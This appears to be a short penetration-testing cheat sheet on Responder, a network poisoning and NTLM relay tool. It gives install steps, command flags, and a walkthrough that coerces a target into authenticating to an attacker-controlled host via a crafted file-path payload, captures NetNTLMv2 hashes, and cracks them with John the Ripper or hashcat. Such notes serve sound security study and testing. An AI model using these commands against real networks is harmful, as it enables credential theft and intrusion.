# Responder

## Overview

IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay.

https://github.com/lgandx/Responder


## SMB NTLMv1/v2 Relay

When the target machine attempts to perform the NTLM authentication to that server, Responder
sends a challenge back for the server to encrypt with the user's password. When the server responds,
Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't
reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same
challenge-response, and if we find one, we know that is the password. This is often referred to as hash
cracking, which we'll do with a program called John The Ripper.

Check in the Responder.conf file that the flag for SMB is ON.
Then run Responder with

	sudo python3 Responder.py -I <interface_name> (or sudo responder -I <interface_name>)

Now that the Responder server is listening, we make a request for a nonexistent file in our local machine so that Responder can get the NTLVM hash/challenge

	http:\\<target_ip>/?page=//<our_ip>/somefile

	or

	gci \\<local_ip>\share\somefile #from powershell

You should see the hash printed on Responder. Save the hash to a file and crack it with a tool like johntheripper or hashcat
## Installation

	git clone https://github.com/lgandx/Responder
	Default installation path (in Kali):  /usr/share/responder/

## Command Options

	-I <interface_name> : Sets which interface to linsten/use
	-A:	Analyse mode. Sees requests but doesnt respond.

	-w: enables SMB poisoning.
	-r: captures hashes from NTLM authentication.
	-f: forces logging to a file.
	-v: increase verbosity


## Usage

	sudo responder -I <interface_name> -wrf -v

Only analyse

	sudo responder -I <interface_name> -A -v